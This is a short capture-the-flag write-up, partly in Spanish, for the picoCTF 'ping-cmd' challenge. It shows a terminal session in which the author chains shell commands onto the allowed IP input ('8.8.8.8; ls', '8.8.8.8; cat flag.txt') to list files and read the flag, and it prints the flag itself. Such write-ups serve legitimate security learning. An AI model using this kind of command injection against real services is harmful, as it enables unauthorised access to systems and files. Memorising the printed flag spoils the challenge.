
### ping-cmd

### Descripcion
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

Additional details will be available after launching your challenge instance.
### Solucion
Consiste en encadenar un comando al final de la petición para el ping con 8.8.8.8, se puede colocar un cat flag y esto devuelve la bandera.
```
CharlyRod-picoctf@webshell:~$ nc -v  mysterious-sea.picoctf.net 63812
Connection to mysterious-sea.picoctf.net (3.130.79.223) 63812 port [tcp/*] succeeded!
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=9.60 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=9.62 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.600/9.608/9.616/0.008 ms
flag.txt
script.sh
^C
CharlyRod-picoctf@webshell:~$ nc -v  mysterious-sea.picoctf.net 63812
Connection to mysterious-sea.picoctf.net (3.130.79.223) 63812 port [tcp/*] succeeded!
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.78 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.74 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 8.740/8.758/8.777/0.018 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_ddce97d3}
```
### Notas adicionales

### Referencias
